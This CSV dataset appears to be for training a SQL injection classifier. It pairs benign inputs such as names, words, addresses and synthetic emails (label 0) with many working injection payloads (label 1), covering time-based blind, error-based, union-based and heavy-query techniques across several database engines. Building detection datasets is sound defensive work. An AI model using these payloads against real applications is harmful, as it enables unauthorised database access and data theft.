Query,Label
gervasio,0
reencar!nacin,0
caballol menocal,0
silb7dor,0
"-2149""))) or elt(1032=1032,3623) and (((""hoon"" like ""hoon",1
1096,0
integrat,0
cruicksh,0
subidor,0
fuente ezcurra,0
"-1844') union all select 9572,9572,9572,9572#",1
1')) and (select * from (select(sleep(5)))fzno) and (('vpqr'='vpqr,1
villodrigo,0
"1"" where 6179=6179;begin user_lock.sleep(5); end--",1
"1) where 8338=8338 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
"1'+(select 'jkgf' where 7487=7487;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
norean,0
"1%'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
t8r0en,0
"1%"") and (3020=3020)*6703 and (""%""=""",1
"1,(select (case when (9443=9443) then sleep(5) else 9443*(select 9443 from information_schema.character_sets) end))",1
8180,0
"1 where 1992=1992 union all select null,null--",1
04211,0
"1%');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ('%'='",1
"1'||(select 'pmpd' where 9803=9803;call regexp_substring(repeat(right(char(3702),0),500000000),null))||'",1
55964057c,0
52535718s,0
romangordo,0
cioffi,0
"1') where 8291=8291;select * from generate_series(5980,5980,case when (5980=5063) then 1 else 0 end) limit 1--",1
"-3733')) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('ybgd'='ybgd",1
"-2430') union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",1
"1""))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((""jywy"" like ""jywy",1
es2eri5o,0
"1"" and elt(3114=3114,sleep(5))#",1
41710,0
"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('xzcr'='xzcr",1
1')));select case when 3819=1887 then 1 else null end--,1
yuncos,0
sashya,0
0936495801431480,0
rafart baquer,0
arrufat miralles,0
dre,0
8790895171234504,0
"1"") and (select * from (select(sleep(5)))gcrr)#",1
sinesio,0
1933711327714835,0
4760,0
frigiliana,0
spears,0
"1"" where 6325=6325 union all select null,null,null,null,null,null,null,null,null,null#",1
"1"") as eaxo where 2728=2728;waitfor delay '0:0:5'--",1
37291,0
sa5na,0
"1%"") and 8407=(select count(*) from generate_series(1,5000000)) and (""%""=""",1
eduviges,0
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",1
1'))) and 6991=5579,1
"1'))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((('drvk' like 'drvk",1
asia,0
35212,0
croiseti,0
49714,0
"1%"");select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",1
ba46ea5,0
1') where 4277=4277 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1
"1"") or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""nnmz"" like ""nnmz",1
carataunas,0
savino,0
descerrajada,0
encuar,0
pt*rido,0
-5369') or 3208=6669#,1
"1%"")) union all select null,null,null,null,null,null,null,null,null--",1
"-7320"") where 3907=3907 union all select 3907,3907--",1
karlweiss@barnicesuv.gov,0
"1'||(select 'alxi' where 3967=3967 and 2388=benchmark(5000000,md5(0x6d457153))#",1
pascual,0
leoine,0
amsterdam@mailboxrussia.nz,0
mohar@ropadegolf.gg,0
62128531b,0
enedn,0
schoelen.boswell@phd-photodecor.ca,0
ex074ico,0
atezada,0
"calle hemingway, s/n",0
-2432')) or (8459=8459)*4906 and (('ejhp'='ejhp,1
"1"" or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
goodman4,0
1541444021319279,0
08580,0
nella,0
cjar,0
"1%')) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
9955615288852463,0
dominguez@comercioenlacalle.hn,0
19311,0
agam1,0
"c/ iglesia, 37, 12?c",0
1) where 9344=9344;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1
"1"") as nqtn where 5606=5606 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
foss,0
"plaza museo, 45, 6e",0
t2naja,0
planes fonterosa,0
usufrut*uar,0
"1"") and 7533=7533 and (""jfsw"" like ""jfsw",1
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)),1
"arco, el",0
"1%"")(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (""%""=""",1
troule politi,0
16124624z,0
18126,0
"1"") or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (""dwpa""=""dwpa",1
daly@diagnosticoradiologico.jm,0
reclinar,0
2526,0
ag77avacin,0
1498074049868909,0
"calle padre arintero, 149",0
19492,0
"1%""))) and elt(4249=4249,7259) and (((""%""=""",1
c/ domingo bello espinosa 138,0
"1"" and (select * from (select(sleep(5)))fzno) and ""gddl"" like ""gddl",1
-3105' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'srep'='srep,1
"1 union all select null,null,null,null,null,null,null,null,null,null--",1
"1"";select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""kndm""=""kndm",1
"1));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
7913903562647722,0
1499,0
"-8933) as iiyr where 1974=1974 union all select 1974,1974,1974,1974,1974#",1
80937614q,0
1%')) or 6793=(select 6793 from pg_sleep(5)) and (('%'=',1
"1"";select sleep(5) and ""irxg""=""irxg",1
27001,0
"1"")) as qejm where 9014=9014 union all select null,null,null,null,null,null#",1
esculpidura,0
c/ badaia 10 10-h,0
am6456ra,0
"1%""))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""%""=""",1
vettenranta@infopromo.az,0
mouchet@007tv.fj,0
"-6636'))) or elt(1032=1032,3623) and ((('kgip'='kgip",1
estolano boget,0
2244921574247376,0
"1"")) as eglv where 7412=7412 union all select null#",1
15821726a,0
hakeem,0
5934470269440414,0
92439025r,0
colote,0
"1%');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('vgkt'='vgkt",1
r3ic5,0
"-8869"" where 3019=3019 union all select 3019,3019,3019#",1
versini@clubdecampo.com.bi,0
"1"") union all select null,null#",1
08586,0
"-5026' where 7324=7324 union all select 7324,7324--",1
30666350j,0
"1"") where 8571=8571 and elt(4249=4249,7259)--",1
5302,0
zarzosa,0
"1"")) or (select * from (select(sleep(5)))ydpu) and ((""knbx""=""knbx",1
atrazar,0
augusto,0
"1')) as uvxv where 6663=6663 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"1"" where 9618=9618 and (3020=3020)*6703--",1
brenda,0
98726186c,0
"1'||(select 'nbmo' from dual where 5572=5572 and 8635=(select count(*) from generate_series(1,5000000))--",1
"1')));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
ceibo,0
"1%"") or elt(6272=6272,sleep(5)) and (""%""=""",1
40984940k,0
nelson@coreserv.cf,0
1') where 8575=8575 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,1
loralie,0
1%';waitfor delay '0:0:5'--,1
sintes novoa,0
"1,(select (case when (3717=3717) then 1 else 3717*(select 3717 from master..sysdatabases) end))",1
requisitorio,0
watanabe,0
"calle san sebastian, 154 13d",0
"1'||(select 'bqhi' from dual where 7409=7409;call regexp_substring(repeat(right(char(3702),0),500000000),null))||'",1
3586735536952135,0
535,0
37618946p,0
ac6di9o,0
76706902q,0
"1%"") rlike (select (case when (7736=7642) then 1 else 0x28 end)) and (""%""=""",1
"1');select * from generate_series(3427,3427,case when (3427=7516) then 1 else 0 end) limit 1--",1
"plaza hernan cortes 199, 4f",0
"c/ santa clara 126, 6?e",0
wildbolz.deste@meneamex.sg,0
25265,0
"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",1
2872946473881757,0
1) where 2223=2223;(select * from (select(sleep(5)))acdk)#,1
amidou@suncorp.gob,0
"-7329""))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (((""borw"" like ""borw",1
kaidanovsky@soybueno.lt,0
berleand@campanasextractoras.la,0
1) and (select * from (select(sleep(5)))fzno),1
"1') where 3476=3476 and elt(1210=1210,sleep(5))--",1
charisse,0
sennett@ankawaelda.tr,0
"1""))) rlike (select * from (select(sleep(5)))vwyq)#",1
"c/ marton y gavin, 145, 6?e",0
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('gfxr'='gfxr",1
13630,0
jobye,0
"c/ ciudad de sueca s/n,",0
45514,0
1466,0
29427,0
carol,0
"poblets, els",0
"1"")));select benchmark(5000000,md5(0x4c4d6142)) and (((""bqfj"" like ""bqfj",1
"1%' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and '%'='",1
"-4639""))) or 8550=9348",1
averell9,0
